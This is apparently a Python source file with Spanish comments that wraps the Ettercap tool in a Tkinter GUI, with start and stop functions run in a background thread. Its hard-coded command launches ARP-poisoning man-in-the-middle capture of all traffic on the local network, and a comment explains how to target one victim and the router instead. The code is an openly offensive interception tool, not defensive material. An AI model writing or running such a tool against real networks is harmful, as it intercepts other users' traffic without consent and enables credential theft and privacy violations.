import subprocess
import tkinter as tk
import threading

proceso_ettercap = None #variable para iniciar y parar ettercap

# Comando para capturar tráfico HTTP de toda la red
ettercap_console = "sudo ettercap -Tq -M ARP /// ///" ##todos los dispositivos en la red son capturados, el primer /(aqui va la ip si quisiera una sola victica)// es para la victima y el segundo /// para el router
def start_ettercap_en_hilo(ettercap_entry):
    def start_ettercap():
        global proceso_ettercap
        try:
            # Ejecutar Ettercap en segundo plano
            proceso_ettercap = subprocess.Popen(ettercap_console, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            ettercap_entry.delete("1.0", tk.END)
            ettercap_entry.insert(tk.END, "Ettercap se está ejecutando...\n")

            for line in proceso_ettercap.stdout:
                ettercap_entry.insert(tk.END, f"{line.strip()}\n")
            
            #Mantener el script corriendo o esperar a que Ettercap termine
            #proceso_ettercap.wait()
            proceso_ettercap = None  # Reiniciar la variable al finalizar

        except Exception as e:
            ettercap_entry.insert(tk.END, f"ERROR: No se pudo iniciar Ettercap: {e}\n")

    hilo = threading.Thread(target=start_ettercap)
    hilo.daemon = True  # Permite que el hilo se detenga al cerrar la aplicación
    hilo.start()

def stop_ettercap_en_hilo(ettercap_entry):
    global proceso_ettercap
    if proceso_ettercap and proceso_ettercap.poll() is None:  #Verifica si el proceso sigue activo
        proceso_ettercap.terminate()  #Intenta terminar el proceso
        proceso_ettercap = None
        ettercap_entry.delete("1.0", tk.END)
        ettercap_entry.insert(tk.END, "Ettercap ha sido detenido.\n")
    else:
        ettercap_entry.insert(tk.END, "No hay ningún proceso de Ettercap ejecutándose.\n")